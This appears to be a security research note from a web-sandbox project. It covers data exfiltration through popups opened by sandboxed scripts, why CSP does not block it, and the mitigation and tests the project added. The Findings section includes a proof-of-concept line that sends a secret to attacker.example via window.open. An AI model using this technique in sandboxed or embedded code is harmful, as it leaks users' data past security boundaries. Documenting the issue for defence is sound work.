# Research 13: Popup Exfiltration

*Originally written as "Research 11" on the `research/popup-exfiltration-…` branch
([PR #3](https://github.com/MentalGear/web-sandbox/pull/3)); renumbered because 11 is now
[meta-CSP delivery](../11_meta_csp_delivery/README.md). Re-verified against the current code in
`reproduce.spec.ts`. Tracked as backlog **S12**.*

## Summary

`allow-popups` lets a sandboxed script exfiltrate data by opening a new window to an
attacker-controlled URL. The CSP's `connect-src` does not apply: a popup is a navigation of a new
top-level browsing context, not a fetch, and no shipped CSP directive restricts it (`navigate-to`
was dropped from the spec). The wrapper frame's `frame-src` (research 14) does not apply either,
because a popup is not a child frame.

## Findings

### 1. Data exfiltration via URL parameters (confirmed)

```javascript
const secret = "SENSITIVE_DATA";
window.open("http://attacker.example/?leak=" + secret);
```

The browser requests `http://attacker.example/?leak=SENSITIVE_DATA` — the request URL is the
payload, so the exfiltration is complete before anything renders.

### 2. CSP bypass via `data:` URI (mitigated by the browser)

`window.open("data:text/html,<script>…</script>")` from a sandboxed frame is blocked by Chromium,
which refuses renderer-initiated top-level navigations to `data:` URLs.

## Mitigation (implemented)

`allow-popups` is no longer accepted in `capabilities`. It moved to `unsafeCapabilities`, an
explicit opt-in that logs a warning per instance (`src/csp-directives.ts`, `src/lib/capabilities.ts`).
The same tier holds `allow-modals`, `allow-downloads` and `allow-presentation`.

| Test | Asserts |
| :--- | :--- |
| 13.1 | `allow-popups` passed in `capabilities` is dropped with a warning; no request reaches the attacker |
| 13.2 | the `unsafeCapabilities` opt-in still opens the popup (documented risk) and warns |

## Residual risk

With the opt-in, popups remain a one-request exfiltration channel. Only enable it for guests that
never see data that must stay in the sandbox.
